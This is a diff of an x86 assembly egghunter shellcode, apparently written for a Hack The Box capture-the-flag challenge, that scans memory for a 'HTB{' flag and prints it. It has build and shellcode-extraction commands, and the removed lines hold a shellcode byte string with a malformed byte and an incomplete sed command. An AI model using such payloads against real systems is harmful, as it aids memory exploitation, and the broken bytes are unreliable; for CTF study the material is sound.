@@ -1,26 +1,17 @@
-; credit to Shakugan. I was drowning.
-; slightly adjusted, I added 'xor eax, eax', eax would go from [0xffffffea] to [0xffffff21]
-; instead of [0x21] for access() syscall, leading to a crash.
+; credit to Shakugan for the help.
+; slightly adjusted, I added 'xor eax, eax', eax would go from [0xffffffea] to 
+; [0xffffff21] instead of [0x21] for access() syscall, leading to a crash.
+; Didn't use alarm() syscall, it works for me without it local & remote.
 
 ; nasm -f elf32 -o x3.o x3.s
 ; ld -m elf_i386 -s -o x3 x3.o
-; objdump -d ./x3|grep '[0-9a-f]:'|grep -v 'file'|cut -f2 -d:|cut -f1-6 -d' '|tr -s ' '|tr '\t' ' '|sed 's/ $/'|sed 's/ /\\x/g'|paste -d '' -s |sed 's/^/"/'|sed 's/$/"/g'"\x6a\x3c\x5b\x6a\x07\x58\xcd\x80\xba\x00\x00\x00\x00\x66\x81\xca\xff\x0f\x42\x60\x31\xc9\x8d\x5a\x04\x31\xc0\xb0\x2xcd\x80\x3c\xf2\x61\x74\xe9\xbf\x48\x54\x42\x7b\x39\x3a\x75\xe5\x89\xd1\x6a\x24\x5a\x6a\x01\x5b\x6a\x04\x58\xcd\x80"
-
-
+; objdump -d ./x3|grep '[0-9a-f]:'|grep -v 'file'|cut -f2 -d:|cut -f1-6 -d' '|tr -s ' '|tr '\t' ' '|sed 's/ $/'|sed 's/ /\\x/g'|paste -d '' -s |sed 's/^/"/'|sed 's/$/"/g'
 
 global _start
 
-
 section .text
 
-
 _start:
-  push 0x3c                  ; set duration for arg1 of alarm()
-  pop ebx
-  push 0x7
-  pop eax
-  int 0x80                   ; SYSCALL alarm(7)
-  
   mov edx, 0        	     ; set start address to search for the egg         
 
 next_page:
